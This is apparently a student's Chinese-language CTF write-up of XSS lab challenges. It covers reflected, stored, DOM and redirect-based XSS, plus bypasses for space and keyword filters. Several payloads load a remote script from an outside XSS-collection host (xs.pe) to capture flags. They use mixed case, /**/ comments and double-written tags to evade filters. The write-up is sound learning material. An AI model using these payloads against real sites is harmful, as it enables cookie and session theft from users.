# 寒假WEEK3

## [XSS反射型] 

![image-20250208182207426](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250208182207426.png)

打开网站，发现可以输入姓名和url，随便输入一个admin的名字，发现下面的内容变成了admin

![image-20250208182220050](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250208182220050.png)

再次输入:

```
<script>alert(/xss/)</script>
```

发现如愿出现了弹窗，说明存在反射型xss漏洞

 ![image-20250208182256745](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250208182256745.png)

TLXSS网站上挑一个XSS语句粘贴上去，submit以后，xss脚本注入成功，在url中粘贴当前的url，即可在TLXSS网站上查看到flag



## [XSS储存型] 

略，同反射型



## [XSS DOM反射]

打开网址，和之前的差不多，随便输入一个1看一看，发现内容发生了变化

![image-20250208182628941](C:\Users\lenovo\Desktop\24-aye-hoyosei\image\image-20250208182628941.png)

右键查看源码，发现一句

```
<script> 

$("#text")[0].innerHTML = '1'; 

</script>
```

不难看出我们输入的内容由这句话控制

输入：

```
';</script><sCRiPt sRC=//xs.pe/jhg></sCrIpT></script>
```

语句闭合，将xss脚本注入，再输入当前url，在TLXSS网站上刷新一下即可得到flag



## [XSS DOM跳转]

右键查看代码：

```
<script> 

var target = location.search.split("=") 

if (target[0].slice(1) == "jumpto") { 

  location.href = target[1]; 

} 

</script>
```

一段看起来很重要的js代码，但看不大懂，丢给ai审计一下代码，这段代码会查询是否包含jumpto参数，如果存在，则跳转至=后的目标url。

故bp传参：?jumpto=javascript:$.getScript("//xs.pe/jhg")

将当前url粘贴以后在TLXSS刷新一下，得到flag



## [XSS] 空格绕过

老样子，输入

```
<sCRiPt sRC=//xs.pe/jhg></sCrIpT>
```

却发现空格被过滤了。

替换成/**/

输入

```
<sCRiPt/**/sRC=//xs.pe/jhg></sCrIpT>
```

注入后粘贴当前url，TLXSS查看即可得到flag



## [XSS] 关键词绕过

直接注入

```
<sCRiPt sRC=//xs.pe/jhg></sCrIpT>
```

再复制url即可得到flag

后来经过尝试，发现这里ban的就是script，XLXSS平台给的就已经用大小写绕过了

再试一下双写绕过

```
<scrscriptipt sRC=//xs.pe/jhg></scrscriptipt>
```

仍然可以成功